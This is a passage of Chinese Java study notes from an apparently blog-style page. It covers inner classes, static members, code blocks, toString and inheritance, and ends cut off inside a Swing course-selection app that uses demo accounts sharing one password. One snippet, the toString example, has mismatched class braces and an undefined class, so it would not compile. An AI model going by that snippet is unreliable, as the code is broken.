function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>局部内部类只能在所定义得方法体内部使用</li><li>不能被public，static等修饰</li><li>几乎不会被使用</li></ul><h2 id="匿名内部类-学完接口回来"><a href="#匿名内部类-学完接口回来" class="headerlink" title="匿名内部类(学完接口回来)"></a>匿名内部类(学完接口回来)</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><h1 id="static"><a href="#static" class="headerlink" title="static"></a>static</h1><ul><li>static 修饰的成员变量称为静态成员变量，最大特性是：不属于某个具体的对象，是所有对象所共享的。<br><em>静态成员变量特征</em></li><li>不属于某个具体的对象，是类的属性，是所有对象所共享的。不存在某个对象的空间中。</li><li>既可以通过对象访问，也可以通过类名访问，但一般推荐类名访问</li><li>类变量储存在方法区中</li><li>生命周期伴随类的一生，随类的加载而创建，随类的卸载而销毁</li><li>静态的方法内也不能访问非静态的成员或方法但非静态的可以</li><li>静态方法无法重写，不能用来实现多态</li><li>初始化要么在类内，要么在类外</li></ul><h1 id="代码块"><a href="#代码块" class="headerlink" title="代码块"></a>代码块</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Stu</span> &#123;</span><br><span class="line">    <span class="keyword">public</span>  <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;yxz&quot;</span>;<span class="comment">//就地初始化，但只适合默认的一些量</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//构造方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Stu</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;不带参数的构造方法&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;实例代码块&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;静态代码块&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Stu</span> <span class="variable">stu</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Stu</span>();<span class="comment">//静态的执行的更快</span></span><br><span class="line">        <span class="type">Stu</span> <span class="variable">stu2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Stu</span>();<span class="comment">//static只会执行1次，赋值时如果都是static就看顺序</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="对象的打印"><a href="#对象的打印" class="headerlink" title="对象的打印"></a>对象的打印</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;A&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;a=&quot;</span> + a +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test2</span> &#123;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">A</span> <span class="variable">a</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">A</span>();</span><br><span class="line">        System.out.println(a);</span><br><span class="line">        System.out.println(<span class="keyword">new</span> <span class="title class_">OuterClass2</span>());<span class="comment">//匿名对象 ,只能使用一次</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>右键-&gt;生成-&gt;toString()</p><h1 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Animal</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(name + <span class="string">&quot;正在吃饭！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Dog</span> <span class="keyword">extends</span> <span class="title class_">Animal</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">barks</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(name + <span class="string">&quot;汪汪叫！&quot;</span> + <span class="string">&quot;年龄&quot;</span> + age);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Cat</span> <span class="keyword">extends</span> <span class="title class_">Animal</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">catchMouse</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(name + <span class="string">&quot;正在抓老鼠&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">jc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Dog</span> <span class="variable">dog</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Dog</span>();</span><br><span class="line">        dog.name = <span class="string">&quot;ctl&quot;</span>;</span><br><span class="line">        dog.age = <span class="number">12</span>;</span><br><span class="line">        dog.barks();</span><br><span class="line">        dog.eat();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>子类会将父类的成员变量和方法继承到子类中</li><li>子类继承父类之后，必须要添加自己特有的成员，体现出与基类的不同，否则就没必要继承了。</li><li>私有的成员可以被继承但不能访问，所以会报错</li></ul><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Base</span> &#123;</span><br><span class="line">    <span class="type">int</span> a;</span><br><span class="line">    <span class="type">int</span> b;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">methodA</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Base中的methodA()&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Jc2</span> <span class="keyword">extends</span> <span class="title class_">Base</span> &#123;</span><br><span class="line">    <span class="type">int</span> a;</span><br><span class="line">    <span class="type">int</span> b;</span><br><span class="line">    <span class="type">int</span> c;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span>  <span class="title function_">methodB</span><span class="params">()</span> &#123;</span><br><span class="line">        a = <span class="number">10</span>;<span class="comment">//当父类和字类拥有同名变量时，优先访问类自己的</span></span><br><span class="line">        <span class="built_in">super</span>.b = <span class="number">20</span>;</span><br><span class="line">        c = <span class="number">30</span>;</span><br><span class="line"></span><br><span class="line">        System.out.println(a);</span><br><span class="line">        System.out.println(b);</span><br><span class="line">        System.out.println(<span class="built_in">super</span>.b);</span><br><span class="line">        System.out.println(c);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Jc2</span> <span class="variable">jc2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Jc2</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">Base</span> <span class="variable">base</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Base</span>();</span><br><span class="line">        System.out.println();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Base</span> &#123;</span><br><span class="line">    <span class="type">int</span> a;</span><br><span class="line">    <span class="type">int</span> b;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">methodA</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Base中的methodA()&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Jc2</span> <span class="keyword">extends</span> <span class="title class_">Base</span> &#123;</span><br><span class="line"><span class="comment">/*    public void methodA() &#123;</span></span><br><span class="line"><span class="comment">        System.out.println(&quot;Jc2中的methodA（）&quot;);</span></span><br><span class="line"><span class="comment">    &#125;*/</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">methodB</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Jc2中的methodB（）&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">methodC</span><span class="params">()</span> &#123;</span><br><span class="line">        methodB();<span class="comment">// 访问子类自己的methodB（）</span></span><br><span class="line">        methodA();<span class="comment">// 访问子类继承的methodA（）</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Jc2</span> <span class="variable">jc2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Jc2</span>();</span><br><span class="line">        jc2.methodC();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="学生选课系统"><a href="#学生选课系统" class="headerlink" title="学生选课系统"></a>学生选课系统</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.awt.BorderLayout;</span><br><span class="line"><span class="keyword">import</span> java.awt.CardLayout;</span><br><span class="line"><span class="keyword">import</span> java.awt.Component;</span><br><span class="line"><span class="keyword">import</span> java.awt.FlowLayout;</span><br><span class="line"><span class="keyword">import</span> java.awt.GridLayout; </span><br><span class="line"><span class="keyword">import</span> java.awt.event.*;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">import</span> java.util.stream.Collectors;</span><br><span class="line"><span class="keyword">import</span> java.util.Map.Entry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.swing.*;</span><br><span class="line"><span class="keyword">import</span> javax.swing.event.MenuEvent;</span><br><span class="line"><span class="keyword">import</span> javax.swing.event.MenuListener;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CourseSelectionSystem</span>&#123;</span><br><span class="line">    Database db;</span><br><span class="line">    LoginFrame login_frame;</span><br><span class="line">    MainFrame manager_frame;</span><br><span class="line">    Teach teach;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">CourseSelectionSystem</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        db = <span class="keyword">new</span> <span class="title class_">Database</span>(<span class="string">&quot;course.txt&quot;</span>,<span class="string">&quot;score.txt&quot;</span>,<span class="string">&quot;account.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">        db.addAccount(<span class="string">&quot;teach&quot;</span>, <span class="string">&quot;666666&quot;</span>, <span class="number">0</span>, <span class="string">&quot;教务员  &quot;</span>);  <span class="comment">//增加新账号</span></span><br><span class="line">        db.addAccount(<span class="string">&quot;lil&quot;</span>, <span class="string">&quot;666666&quot;</span>, <span class="number">1</span>, <span class="string">&quot;李立  &quot;</span>);</span><br><span class="line">        db.addAccount(<span class="string">&quot;yangf&quot;</span>, <span class="string">&quot;666666&quot;</span>, <span class="number">1</span>, <span class="string">&quot;杨帆  &quot;</span>);</span><br><span class="line">        db.addAccount(<span class="string">&quot;zhangdw&quot;</span>, <span class="string">&quot;666666&quot;</span>, <span class="number">1</span>, <span class="string">&quot;张大伟  &quot;</span>);</span><br><span class="line">        db.addAccount(<span class="string">&quot;wangqs&quot;</span>, <span class="string">&quot;666666&quot;</span>, <span class="number">2</span>, <span class="string">&quot;王青松  &quot;</span>);</span><br><span class="line">        db.addAccount(<span class="string">&quot;chenl&quot;</span>, <span class="string">&quot;666666&quot;</span>, <span class="number">2</span>, <span class="string">&quot;陈丽  &quot;</span>);</span><br><span class="line">        db.addAccount(<span class="string">&quot;wus&quot;</span>, <span class="string">&quot;666666&quot;</span>, <span class="number">2</span>, <span class="string">&quot;吴松  &quot;</span>);</span><br><span class="line">        db.addAccount(<span class="string">&quot;liuq&quot;</span>, <span class="string">&quot;666666&quot;</span>, <span class="number">2</span>, <span class="string">&quot;刘强  &quot;</span>);</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">        teach = <span class="keyword">new</span> <span class="title class_">Teach</span>(db);</span><br><span class="line">        login_frame = <span class="keyword">new</span> <span class="title class_">LoginFrame</span>(db, teach);</span><br><span class="line">        manager_frame = <span class="keyword">new</span> <span class="title class_">MainFrame</span>(db);</span><br><span class="line">        login_frame.initFrame(manager_frame);</span><br><span class="line">        manager_frame.initFrame(login_frame);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> LoginFrame <span class="title function_">getLogin</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> login_frame;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">CourseSelectionSystem</span> <span class="variable">css</span> <span class="operator">=</span>  <span class="keyword">new</span> <span class="title class_">CourseSelectionSystem</span>();</span><br><span class="line">        css.getLogin().setVisible(<span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MainFrame</span> <span class="keyword">extends</span> <span class="title class_">JFrame</span>&#123;</span><br><span class="line">    Database db;</span><br><span class="line">    LoginFrame login_frame;</span><br><span class="line">    <span class="keyword">private</span> User user;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">JButton</span> <span class="variable">manager_new_course</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JButton</span>(<span class="string">&quot;添加课程&quot;</span>);</span><br><span class="line">    <span class="keyword">private</span> <span class="type">JButton</span> <span class="variable">student_select_course</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JButton</span>(<span class="string">&quot;选择课程&quot;</span>);</span><br><span class="line">    <span class="keyword">private</span> <span class="type">JButton</span> <span class="variable">student_delect_course</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JButton</span>(<span class="string">&quot;删除课程&quot;</span>);</span><br><span class="line">    <span class="keyword">private</span> <span class="type">JButton</span> <span class="variable">teacher_view_course</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JButton</span>(<span class="string">&quot;查看选课情况&quot;</span>);</span><br><span class="line">    <span class="keyword">private</span> <span class="type">JButton</span> <span class="variable">teacher_info_course</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JButton</span>(<span class="string">&quot;查看课程信息&quot;</span>);</span><br><span class="line">    <span class="keyword">private</span> <span class="type">JButton</span> <span class="variable">teacher_score</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JButton</span>(<span class="string">&quot;打分&quot;</span>);</span><br><span class="line">    <span class="keyword">private</span> <span class="type">JLabel</span> <span class="variable">manager_jl_0</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JLabel</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">JLabel</span> <span class="variable">teacher_jl_0</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JLabel</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">JLabel</span> <span class="variable">teacher_jl_1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JLabel</span>(<span class="string">&quot;选择课程:&quot;</span>);</span><br><span class="line">    <span class="keyword">private</span> <span class="type">JLabel</span> <span class="variable">student_jl_0_0</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JLabel</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">JLabel</span> <span class="variable">student_jl_0_1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JLabel</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">JLabel</span> <span class="variable">student_jl_0_2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JLabel</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">JTextField</span> <span class="variable">manager_jt_course_name</span> <span class="operator">=</span>  <span class="keyword">new</span> <span class="title class_">JTextField</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">JTextField</span> <span class="variable">manager_jt_course_info</span> <span class="operator">=</span>  <span class="keyword">new</span> <span class="title class_">JTextField</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">JTextField</span> <span class="variable">teacher_jt_score</span> <span class="operator">=</span>  <span class="keyword">new</span> <span class="title class_">JTextField</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">JLabel</span> <span class="variable">manager_jl_init</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JLabel</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">JLabel</span> <span class="variable">teacher_jl_init</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JLabel</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">JLabel</span> <span class="variable">student_jl_init</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JLabel</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">JLabel</span> <span class="variable">manager_jl_1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JLabel</span>(<span class="string">&quot;课程名字\n&quot;</span>);</span><br><span class="line">    <span class="keyword">private</span> <span class="type">JLabel</span> <span class="variable">manager_jl_2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JLabel</span>(<span class="string">&quot;课程教师\n&quot;</span>);</span><br><span class="line">    <span class="keyword">private</span> <span class="type">JLabel</span> <span class="variable">manager_jl_3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JLabel</span>(<span class="string">&quot;课程信息\n&quot;</span>);</span><br><span class="line">    <span class="keyword">private</span> <span class="type">JComboBox</span> <span class="variable">manager_jc_teacher</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JComboBox</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">JComboBox</span> <span class="variable">teacher_jc_course</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JComboBox</span>();</span><br><span class="line">    </span><br><span class="line">    <span class="type">DefaultListModel</span> <span class="variable">student_select_course_dlm</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultListModel</span>();</span><br><span class="line">    <span class="type">JList</span> <span class="variable">student_select_course_jl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JList</span>(student_select_course_dlm);</span><br><span class="line">    <span class="type">JScrollPane</span> <span class="variable">student_select_course_jsp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JScrollPane</span>(student_select_course_jl);</span><br><span class="line"></span><br><span class="line">    <span class="type">DefaultListModel</span> <span class="variable">student_delect_course_dlm</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultListModel</span>();</span><br><span class="line">    <span class="type">JList</span> <span class="variable">student_delect_course_jl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JList</span>(student_delect_course_dlm);</span><br><span class="line">    <span class="type">JScrollPane</span> <span class="variable">student_delect_course_jsp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JScrollPane</span>(student_delect_course_jl);</span><br><span class="line">    </span><br><span class="line">    <span class="type">DefaultListModel</span> <span class="variable">teacher_score_dlm</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultListModel</span>();</span><br><span class="line">    <span class="type">JList</span> <span class="variable">teacher_score_jl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JList</span>(teacher_score_dlm);</span><br><span class="line">    <span class="type">JScrollPane</span> <span class="variable">teacher_score_jsp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JScrollPane</span>(teacher_score_jl);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">JPanel</span> <span class="variable">menu_cards</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JPanel</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">CardLayout</span> <span class="variable">menu_c_layout</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CardLayout</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">JPanel</span> <span class="variable">content_cards</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JPanel</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">CardLayout</span> <span class="variable">content_c_layout</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CardLayout</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">JPanel</span> <span class="variable">manager_cards</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JPanel</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">CardLayout</span> <span class="variable">manager_c_layout</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CardLayout</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">JMenuBar</span> <span class="variable">manager_menuBar</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JMenuBar</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">JMenu</span> <span class="variable">manager_menu</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JMenu</span>(<span class="string">&quot;添加课程&quot;</span>);</span><br><span class="line">    <span class="keyword">private</span> <span class="type">JPanel</span> <span class="variable">manager_init_page</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JPanel</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">JPanel</span> <span class="variable">manager_new_course_page</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JPanel</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">JPanel</span> <span class="variable">teacher_cards</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JPanel</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">CardLayout</span> <span class="variable">teacher_c_layout</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CardLayout</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">JMenuBar</span> <span class="variable">teacher_menuBar</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JMenuBar</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">JMenu</span> <span class="variable">teacher_menu</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JMenu</span>(<span class="string">&quot;教学任务管理&quot;</span>);</span><br><span class="line">    <span class="keyword">private</span> <span class="type">JPanel</span> <span class="variable">teacher_init_page</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JPanel</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">JPanel</span> <span class="variable">teacher_score_page</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JPanel</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">JPanel</span> <span class="variable">teacher_score_north</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JPanel</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">JPanel</span> <span class="variable">teacher_score_north_course</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JPanel</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">JPanel</span> <span class="variable">teacher_score_south</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JPanel</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">JPanel</span> <span class="variable">student_cards</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JPanel</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">CardLayout</span> <span class="variable">student_c_layout</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CardLayout</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">JMenuBar</span> <span class="variable">student_menuBar</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JMenuBar</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">JMenu</span> <span class="variable">student_menu_select_course</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JMenu</span>(<span class="string">&quot;选课&quot;</span>);</span><br><span class="line">    <span class="keyword">private</span> <span class="type">JMenu</span> <span class="variable">student_menu_delect_course</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JMenu</span>(<span class="string">&quot;退选&quot;</span>);</span><br><span class="line">    <span class="keyword">private</span> <span class="type">JMenu</span> <span class="variable">student_menu_view_course</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JMenu</span>(<span class="string">&quot;View Course&quot;</span>);</span><br><span class="line">    <span class="keyword">private</span> <span class="type">JPanel</span> <span class="variable">student_init_page</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JPanel</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">JPanel</span> <span class="variable">student_select_course_page</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JPanel</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">JPanel</span> <span class="variable">student_delect_course_page</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JPanel</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">JPanel</span> <span class="variable">student_view_score_page</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JPanel</span>();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MainFrame</span><span class="params">(Database db)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(<span class="string">&quot;选课系统&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.addWindowListener(<span class="keyword">new</span> <span class="title class_">WindowAdapter</span>() &#123;</span><br><span class="line">              <span class="meta">@Override</span></span><br><span class="line">              <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">windowClosing</span><span class="params">(WindowEvent e)</span></span><br><span class="line">              &#123;</span><br><span class="line">                 <span class="keyword">try</span> &#123;</span><br><span class="line">                    db.updataAll();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e1) &#123;</span><br><span class="line"></span><br><span class="line">                    e1.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">                setVisible(<span class="literal">false</span>);</span><br><span class="line">                login_frame.setVisible(<span class="literal">true</span>);</span><br><span class="line">                clear();</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;);</span><br><span class="line">        <span class="built_in">this</span>.db = db;</span><br><span class="line">        </span><br><span class="line">        setLocation(<span class="number">800</span>,<span class="number">400</span>);   </span><br><span class="line"></span><br><span class="line">        setLayout(<span class="keyword">new</span> <span class="title class_">BorderLayout</span>());</span><br><span class="line">        menu_cards.setLayout(menu_c_layout);</span><br><span class="line">        content_cards.setLayout(content_c_layout);</span><br><span class="line">        add(<span class="string">&quot;North&quot;</span>,menu_cards);</span><br><span class="line">        add(<span class="string">&quot;Center&quot;</span>,content_cards);</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">        initManagerPage();</span><br><span class="line">        initTeacherPage();</span><br><span class="line">        initStudentPage();</span><br><span class="line">        </span><br><span class="line">        pack();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">initTeacherPage</span><span class="params">()</span> &#123;</span><br><span class="line">        teacher_score_jl.setCellRenderer(<span class="keyword">new</span> <span class="title class_">ScoreCellRenderer</span>());</span><br><span class="line">        teacher_jc_course.setRenderer(<span class="keyword">new</span> <span class="title class_">CourseTeaCellRenderer</span>());</span><br><span class="line">        </span><br><span class="line">        teacher_menuBar.add(teacher_menu);</span><br><span class="line">        teacher_menu.addMenuListener(<span class="keyword">new</span> <span class="title class_">MenuListener</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">menuSelected</span><span 